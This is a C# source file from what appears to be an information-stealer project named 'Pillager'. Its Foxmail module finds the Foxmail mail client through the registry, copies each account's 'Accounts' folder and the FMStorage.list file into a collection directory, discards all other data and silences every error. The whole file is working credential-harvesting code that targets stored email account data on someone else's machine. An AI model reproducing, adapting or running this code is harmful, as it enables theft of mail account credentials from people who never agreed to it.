using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Mails
{
    internal class Foxmail
    {
        public static string MailName = "Foxmail";

        public static string GetInstallPath()
        {
            try
            {
                string foxPath = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command").GetValue("").ToString();
                foxPath = foxPath.Remove(foxPath.LastIndexOf("Foxmail.exe", StringComparison.Ordinal)).Replace("\"", "");
                return foxPath;
            }
            catch { return ""; }            
        }
        public static void Save(string path)
        {
            try
            {
                string installpath = GetInstallPath();
                if (!Directory.Exists(installpath)||!Directory.Exists(Path.Combine(installpath, "Storage"))) return;
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                foreach (var directory in Directory.GetDirectories(Path.Combine(installpath, "Storage")))
                {
                    Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
                    foreach (var item in Directory.GetDirectories(Path.Combine(savepath, Path.GetFileName(directory))))
                    {
                        if (!item.EndsWith("Accounts"))
                        {
                            Directory.Delete(item,true);
                        }
                    }
                    foreach (var item in Directory.GetFiles(Path.Combine(savepath, Path.GetFileName(directory))))
                    {
                        File.Delete(item);
                    }
                }
                if (File.Exists(Path.Combine(installpath, "FMStorage.list"))) File.Copy(Path.Combine(installpath, "FMStorage.list"), Path.Combine(savepath, "FMStorage.list"));
            }
            catch { }
        }
    }
}
